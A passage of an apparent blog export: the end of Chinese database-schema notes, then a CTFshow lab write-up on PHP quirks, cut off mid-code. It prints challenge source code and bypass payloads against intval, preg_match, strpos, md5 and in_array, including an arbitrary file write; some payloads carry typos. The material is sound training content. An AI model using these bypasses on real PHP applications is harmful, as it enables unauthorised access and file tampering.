<p><code>·例如</code>学生记录，如果按<code>堆</code>存储，则插入一条新记录总是放在学生记录存储的<code>最后</code>.<br><img src="https://img.npfs06.top/20210302151657.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<ul>
<li>如果按·<code>学号升序存储</code>，则插入一条记录就要<code>找到它应在的位置插入</code>，如图1.29（b）所示</li>
<li>如果按照学生<code>年龄聚簇存放</code>，<code>假如</code>新插入的<code>S3</code>是<code>16岁</code>，则应插入的位置如图1.29（c）所示<br><img src="https://img.npfs06.top/20210302151715.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></li>
</ul>
<h4 id="数据库模式、外模式、内模式总结"><a href="#数据库模式、外模式、内模式总结" class="headerlink" title="数据库模式、外模式、内模式总结"></a>数据库模式、外模式、内模式总结</h4><p><img src="https://img.npfs06.top/20210302151731.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"><br><strong>数据库模式</strong></p>
<ul>
<li>即全局逻辑结构是数据库的中心与关键</li>
<li>独立于数据库的其他层次</li>
<li>设计数据库模式结构时应首先确定数据库的逻辑模式</li>
</ul>
<p><strong>数据库的外模式</strong></p>
<ul>
<li>面向具体的应用程序</li>
<li>定义在逻辑模式之上</li>
<li>独立于存储模式和存储设备</li>
<li>当应用需求发生较大变化，相应外模式不能满足其视图要求时，该外模式就得做相应改动</li>
<li>设计外模式时应充分考虑到应用的扩充性</li>
</ul>
<p><strong>数据库的内模式</strong></p>
<ul>
<li>依赖于它的全局逻辑结构</li>
<li>独立于具体的存储设备</li>
<li>将全局逻辑结构中所定义的数据结构及其联系按照一定的物理存储策略进行组织，以达到较好的时间与空间效率</li>
</ul>
<h3 id="数据库的二级映像功能与数据独立性"><a href="#数据库的二级映像功能与数据独立性" class="headerlink" title="数据库的二级映像功能与数据独立性"></a>数据库的二级映像功能与数据独立性</h3><ul>
<li>·<code>三级模式是对数据的三个抽象级别</code></li>
<li><code>二级映象</code>在DBMS内部实现这<code>三个抽象层次</code>的<code>联系</code>和<code>转换</code><ul>
<li>外模式／模式映像</li>
<li>模式／内模式映像<br><img src="https://img.npfs06.top/20210302151743.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></li>
</ul>
</li>
</ul>
<h4 id="外模式／模式映象"><a href="#外模式／模式映象" class="headerlink" title="外模式／模式映象"></a>外模式／模式映象</h4><ul>
<li>模式：描述的是数据的<code>全局</code>逻辑结构</li>
<li>外模式：描述的是数据的<code>局部</code>逻辑结构</li>
<li>同<code>一个模式</code>可以有任意<code>多个外模式</code></li>
<li>每一个外模式，数据库系统都有一个<code>外模式／模式映象</code>，定义外模式与模式之间的对应关系,看成数据库的数据与API调用的部分数据之间的关系(I think)</li>
<li>映象定义通常包含在各自外模式的描述中</li>
</ul>
<p><strong>保证数据的逻辑独立性</strong></p>
<ul>
<li>当<code>模式改变</code>时，数据库管理员<code>修改有关的外模式／模式映象</code>，使<code>外模式</code>保持<code>不变</code></li>
<li>应用程序是依据数据的外模式编写的，从而应用程序不必修改，保证了数据与程序的逻辑独立性，简称<code>数据的逻辑独立性</code>。</li>
</ul>
<h4 id="模式／内模式映象"><a href="#模式／内模式映象" class="headerlink" title="模式／内模式映象"></a>模式／内模式映象</h4><p><strong>模式／内模式映象定义了数据全局逻辑结构与存储结构之间的对应关系。</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">例如，说明逻辑记录和字段在内部是如何表示的</span><br></pre></td></tr></table></figure>
<ul>
<li>数据库中<code>模式／内模式映象</code>是<code>唯一</code>的</li>
<li>该映象定义通常包含在模式描述中</li>
</ul>
<p><strong>保证数据的物理独立性</strong></p>
<ul>
<li>当数据库的<code>存储结构改变</code>了（例如选用了另一种存储结构），数据库管理员<code>修改模式／内模式映象</code>，使模式保持<code>不变</code>.</li>
<li>应用程序不受影响。保证了数据与程序的物理独立性，简称<code>数据的物理独立性</code>。</li>
</ul>
<p><strong>特定的应用程序</strong></p>
<ul>
<li>在外模式描述的数据结构上编制的</li>
<li>依赖于特定的外模式</li>
<li>与数据库的模式和存储结构独立<br>不同的应用程序有时可以共用同一个外模式</li>
</ul>
<p><strong>数据库的二级映像</strong></p>
<ul>
<li>保证了数据库外模式的稳定性</li>
<li>从底层保证了应用程序的稳定性，除非应用需求本身发生变化，否则应用程序一般不需要修改</li>
</ul>
<p><strong>数据与程序之间的独立性，使得数据的定义和描述可以从应用程序中分离出去</strong></p>
<p><strong>数据的存取由DBMS管理</strong></p>
<ul>
<li>用户不必考虑存取路径等细节</li>
<li>简化了应用程序的编制</li>
<li>大大减少了应用程序的维护和修改</li>
</ul>
<h2 id="数据库的组成"><a href="#数据库的组成" class="headerlink" title="数据库的组成"></a>数据库的组成</h2><ul>
<li>数据库</li>
<li>数据库管理系统（及其开发工具）</li>
<li>应用系统</li>
<li>数据库管理员</li>
<li>硬件平台及数据库</li>
<li>软件</li>
<li>人员</li>
</ul>
<h3 id="硬件平台及数据库"><a href="#硬件平台及数据库" class="headerlink" title="硬件平台及数据库"></a>硬件平台及数据库</h3><p><strong>数据库系统对硬件资源的要求</strong></p>
<ul>
<li>(1) 足够大的内存<ul>
<li>操作系统</li>
<li>DBMS的核心模块</li>
<li>数据缓冲区</li>
<li>应用程序</li>
</ul>
</li>
<li>(2) 足够大的外存<ul>
<li>磁盘或磁盘阵列</li>
<li>数据库</li>
<li>光盘、磁带</li>
<li>数据备份</li>
</ul>
</li>
<li>(3) 较高的通道能力，提高数据传送率</li>
</ul>
<h3 id="软件"><a href="#软件" class="headerlink" title="软件"></a>软件</h3><ul>
<li>DBMS</li>
<li>支持DBMS运行的操作系统</li>
<li>与数据库接口的高级语言及其编译系统</li>
<li>以DBMS为核心的应用开发工具</li>
<li>为特定应用环境开发的数据库应用系统</li>
</ul>
<h3 id="人-员"><a href="#人-员" class="headerlink" title="人 员"></a>人 员</h3><ul>
<li>数据库管理员</li>
<li>系统分析员和数据库设计人员</li>
<li>应用程序员</li>
<li>用户</li>
</ul>
<p>不同的人员涉及不同的数据抽象级别，具有不同的数据视图，如下图所示<br><img src="https://img.npfs06.top/20210302151756.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<h5 id="数据库管理员-DBA"><a href="#数据库管理员-DBA" class="headerlink" title="数据库管理员(DBA)"></a>数据库管理员(DBA)</h5><p><strong>具体职责：</strong><br>1.决定数据库中的信息内容和结构<br>2.决定数据库的存储结构和存取策略<br>3.定义数据的安全性要求和完整性约束条件<br>4.监控数据库的使用和运行</p>
<ul>
<li>周期性转储数据库</li>
<li>数据文件</li>
<li>日志文件</li>
<li>系统故障恢复</li>
<li>介质故障恢复</li>
<li>监视审计文件</li>
</ul>
<p>5.数据库的改进和重组</p>
<ul>
<li>性能监控和调优</li>
<li>定期对数据库进行重组织，以提高系统的性能</li>
<li>需求增加和改变时，数据库须需要重构造</li>
</ul>
<h5 id="系统分析员"><a href="#系统分析员" class="headerlink" title="系统分析员"></a>系统分析员</h5><p><strong>具体职责：</strong></p>
<ul>
<li>负责应用系统的需求分析和规范说明</li>
<li>与用户及DBA协商，确定系统的硬软件配置</li>
<li>参与数据库系统的概要设计</li>
</ul>
<h5 id="数据库设计人员"><a href="#数据库设计人员" class="headerlink" title="数据库设计人员"></a>数据库设计人员</h5><p><strong>具体职责：</strong></p>
<ul>
<li>参加用户需求调查和系统分析</li>
<li>确定数据库中的数据</li>
<li>设计数据库各级模式</li>
</ul>
<h5 id="应用程序员"><a href="#应用程序员" class="headerlink" title="应用程序员"></a>应用程序员</h5><p><strong>具体职责：</strong></p>
<ul>
<li>设计和编写应用系统的程序模块</li>
<li>进行调试和安装</li>
</ul>
<h5 id="用户"><a href="#用户" class="headerlink" title="用户"></a>用户</h5><p>用户是指最终用户（End User）。<br>最终用户通过应用系统的用户接口使用数据库。<br>1.偶然用户</p>
<ul>
<li>不经常访问数据库，但每次访问数据库时往往需要不同的数据库信息</li>
<li>企业或组织机构的高中级管理人员</li>
</ul>
<p>2.简单用户</p>
<ul>
<li>主要工作是查询和更新数据库</li>
<li>银行的职员、机票预定人员、旅馆总台服务员</li>
</ul>
<p>3.复杂用户</p>
<ul>
<li>工程师、科学家、经济学家、科技工作者等</li>
<li>直接使用数据库语言访问数据库，甚至能够基于数据库管理系统的API编制自己的应用程序</li>
</ul>
]]></content>
      <categories>
        <category>share</category>
        <category>数据库</category>
      </categories>
  </entry>
  <entry>
    <title>CTFshow_web入门_php特性</title>
    <url>/2021/03/08/CTFshow-web%E5%85%A5%E9%97%A8-php%E7%89%B9%E6%80%A7/</url>
    <content><![CDATA[<p> CTFshow-web入门-php特性 （web89-web150_plus）<a id="more"></a></p>
<h2 id="web-89"><a href="#web-89" class="headerlink" title="web 89"></a>web 89</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$num</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&quot;/[0-9]/&quot;</span>, <span class="variable">$num</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(intval(<span class="variable">$num</span>))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><img src="https://img.npfs06.top/20210308000635.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<p>构造数组绕过即可</p>
<p>payload:?mun[]=1</p>
<h2 id="web-90"><a href="#web-90" class="headerlink" title="web 90"></a>web 90</h2><p><img src="https://img.npfs06.top/20210308001525.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<h2 id="web-91"><a href="#web-91" class="headerlink" title="web 91"></a>web 91</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line"><span class="variable">$a</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">&#x27;/^php$/im&#x27;</span>, <span class="variable">$a</span>))&#123;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/^php$/i&#x27;</span>, <span class="variable">$a</span>))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;hacker&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;nonononono&#x27;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight jboss-cli"><table><tr><td class="code"><pre><span class="line"><span class="string">/i</span>  表示匹配的时候不区分大小写</span><br><span class="line"></span><br><span class="line"><span class="string">/m</span> 表示多行匹配，什么是多行匹配呢？就是匹配换行符两端的潜在匹配。影响正则中的^$符号</span><br></pre></td></tr></table></figure>
<p>这里主要的突破点就是/m，我们可以看到第一个preg_match()函数，有个/m，而第二个正则则没有，我们可以利用换行进行绕过</p>
<p>payload:?cmd=%0aphp</p>
<p>注：%0a是换行的意思</p>
<h2 id="web-92"><a href="#web-92" class="headerlink" title="web 92"></a>web 92</h2><p>和web90是一样的</p>
<p>payload：?num=0x117c</p>
<h2 id="web-93"><a href="#web-93" class="headerlink" title="web 93"></a>web 93</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$num</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$num</span>==<span class="number">4476</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&quot;/[a-z]/i&quot;</span>, <span class="variable">$num</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(intval(<span class="variable">$num</span>,<span class="number">0</span>)==<span class="number">4476</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> intval(<span class="variable">$num</span>,<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


<p>过滤了字母，十六进制弄不了，那就改八进制</p>
<p>payload：?num=010574</p>
<p>4476的八进制为10574</p>
<h2 id="web-94"><a href="#web-94" class="headerlink" title="web 94"></a>web 94</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$num</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$num</span>===<span class="string">&quot;4476&quot;</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&quot;/[a-z]/i&quot;</span>, <span class="variable">$num</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(!strpos(<span class="variable">$num</span>, <span class="string">&quot;0&quot;</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(intval(<span class="variable">$num</span>,<span class="number">0</span>)===<span class="number">4476</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>strpos()</strong></p>
<p><img src="https://img.npfs06.top/20210308001550.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<p>对于strpos()函数，我们可以利用换行进行绕过（%0a）</p>
<p>payload:?num=%0a010574</p>
<p>也可以小数点绕过</p>
<p>payload：?num=4476.0</p>
<p>因为intval()函数只读取整数部分</p>
<p>还可以八进制绕过(%20是空格的url编码形式)</p>
<p>payload：?num=%20010576</p>
<h2 id="web-95"><a href="#web-95" class="headerlink" title="web 95"></a>web 95</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$num</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$num</span>==<span class="number">4476</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&quot;/[a-z]|\./i&quot;</span>, <span class="variable">$num</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no!!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(!strpos(<span class="variable">$num</span>, <span class="string">&quot;0&quot;</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no!!!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(intval(<span class="variable">$num</span>,<span class="number">0</span>)===<span class="number">4476</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


<p>八进制绕过</p>
<p>payload：?num=%20010576</p>
<p>Payload:   ?num=+010574</p>
<h2 id="web-96"><a href="#web-96" class="headerlink" title="web 96"></a>web 96</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;u&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;u&#x27;</span>]==<span class="string">&#x27;flag.php&#x27;</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no&quot;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        highlight_file(<span class="variable">$_GET</span>[<span class="string">&#x27;u&#x27;</span>]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>paylaod:?u=./flag.php</p>
<p>意思就是说显示当前目录下的flag.php文件</p>
<h2 id="web-97"><a href="#web-97" class="headerlink" title="web 97"></a>web 97</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>]) <span class="keyword">and</span> <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;b&#x27;</span>])) &#123;</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>] != <span class="variable">$_POST</span>[<span class="string">&#x27;b&#x27;</span>])</span><br><span class="line"><span class="keyword">if</span> (md5(<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>]) === md5(<span class="variable">$_POST</span>[<span class="string">&#x27;b&#x27;</span>]))</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">&#x27;Wrong.&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>md5碰撞</p>
<p>payload: a=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%00%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%55%5d%83%60%fb%5f%07%fe%a2&amp;b=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%02%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%d5%5d%83%60%fb%5f%07%fe%a2</p>
<p>payload:a[]=1&amp;b[]=1</p>
<h2 id="web-98"><a href="#web-98" class="headerlink" title="web 98"></a>web 98</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="variable">$_GET</span>?<span class="variable">$_GET</span>=&amp;<span class="variable">$_POST</span>:<span class="string">&#x27;flag&#x27;</span>;  </span><br><span class="line"><span class="variable">$_GET</span>[<span class="string">&#x27;flag&#x27;</span>]==<span class="string">&#x27;flag&#x27;</span>?<span class="variable">$_GET</span>=&amp;<span class="variable">$_COOKIE</span>:<span class="string">&#x27;flag&#x27;</span>;</span><br><span class="line"><span class="variable">$_GET</span>[<span class="string">&#x27;flag&#x27;</span>]==<span class="string">&#x27;flag&#x27;</span>?<span class="variable">$_GET</span>=&amp;<span class="variable">$_SERVER</span>:<span class="string">&#x27;flag&#x27;</span>;</span><br><span class="line">highlight_file(<span class="variable">$_GET</span>[<span class="string">&#x27;HTTP_FLAG&#x27;</span>]==<span class="string">&#x27;flag&#x27;</span>?<span class="variable">$flag</span>:<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>
<p>稀里糊涂的就出flag了，讲下大概思路</p>
<p>主要是三元运算符和变量覆盖</p>
<p>$_GET?$_GET=&amp;$_POST:’flag’;   意思就是说如果存在GET请求，则将POAT请求覆盖掉GET请求</p>
<p>highlight_file($<em>GET[‘HTTP_FLAG’]==’flag’?$flag: __FILE _</em>);   意思就是说GET传参HTTP_FLAG的值为flag，则读取flag</p>
<p>所以我就构造了GET：?flag=123</p>
<p>POST：HTTP_FLAG=flag</p>
<p>然后就得到了flag</p>
<h2 id="web-99"><a href="#web-99" class="headerlink" title="web 99"></a>web 99</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$allow</span> = <span class="keyword">array</span>();</span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">36</span>; <span class="variable">$i</span> &lt; <span class="number">0x36d</span>; <span class="variable">$i</span>++) &#123; </span><br><span class="line">    array_push(<span class="variable">$allow</span>, rand(<span class="number">1</span>,<span class="variable">$i</span>));</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;n&#x27;</span>]) &amp;&amp; in_array(<span class="variable">$_GET</span>[<span class="string">&#x27;n&#x27;</span>], <span class="variable">$allow</span>))&#123;</span><br><span class="line">    file_put_contents(<span class="variable">$_GET</span>[<span class="string">&#x27;n&#x27;</span>], <span class="variable">$_POST</span>[<span class="string">&#x27;content&#x27;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>
<p><strong>in_array弱类型比较</strong></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$allow</span> = <span class="keyword">array</span>(<span class="number">1</span>,<span class="string">&#x27;2&#x27;</span>,<span class="string">&#x27;3&#x27;</span>);</span><br><span class="line">var_dump(in_array(<span class="string">&#x27;1.php&#x27;</span>,<span class="variable">$allow</span>));</span><br><span class="line">返回的为<span class="literal">true</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$allow</span> = <span class="keyword">array</span>(<span class="string">&#x27;1&#x27;</span>,<span class="string">&#x27;2&#x27;</span>,<span class="string">&#x27;3&#x27;</span>);</span><br><span class="line">var_dump(in_array(<span class="string">&#x27;1.php&#x27;</span>,<span class="variable">$allow</span>));</span><br><span class="line">返回<span class="literal">false</span></span><br></pre></td></tr></table></figure>


<p><img src="https://img.npfs06.top/20210308001609.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<p><img src="https://img.npfs06.top/20210308001623.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<p>之后在cat flag36d.php即可</p>
<h2 id="web-100-101"><a href="#web-100-101" class="headerlink" title="web 100-101"></a>web 100-101</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;ctfshow.php&quot;</span>);</span><br><span class="line"><span class="comment">//flag in class ctfshow;</span></span><br><span class="line"><span class="variable">$ctfshow</span> = <span class="keyword">new</span> ctfshow();</span><br><span class="line"><span class="variable">$v1</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>];</span><br><span class="line"><span class="variable">$v2</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>];</span><br><span class="line"><span class="variable">$v3</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;v3&#x27;</span>];</span><br><span class="line"><span class="variable">$v0</span>=is_numeric(<span class="variable">$v1</span>) <span class="keyword">and</span> is_numeric(<span class="variable">$v2</span>) <span class="keyword">and</span> is_numeric(<span class="variable">$v3</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$v0</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/\;/&quot;</span>, <span class="variable">$v2</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">&quot;/\;/&quot;</span>, <span class="variable">$v3</span>))&#123;</span><br><span class="line">            <span class="keyword">eval</span>(<span class="string">&quot;<span class="subst">$v2</span>(&#x27;ctfshow&#x27;)<span class="subst">$v3</span>&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>知识点：</p>
<p><strong>and 和 &amp;&amp; 区别</strong></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">Watch out <span class="keyword">for</span> the difference of priority between <span class="string">&#x27;and vs &amp;&amp;&#x27;</span> <span class="keyword">or</span> <span class="string">&#x27;|| vs or&#x27;</span>:</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$bool</span> = <span class="literal">true</span> &amp;&amp; <span class="literal">false</span>;</span><br><span class="line">var_dump(<span class="variable">$bool</span>); <span class="comment">// false, that&#x27;s expected</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$bool</span> = <span class="literal">true</span> <span class="keyword">and</span> <span class="literal">false</span>;</span><br><span class="line">var_dump(<span class="variable">$bool</span>); <span class="comment">// true, ouch!</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$bool</span> = <span class="literal">true</span> <span class="keyword">and</span> <span class="literal">false</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$bool</span>)</span><br><span class="line">    <span class="keyword">print</span> (<span class="number">1</span>)   <span class="comment">//输出为1，因为$bool值为真</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="literal">true</span> <span class="keyword">and</span> <span class="literal">false</span>)</span><br><span class="line">    <span 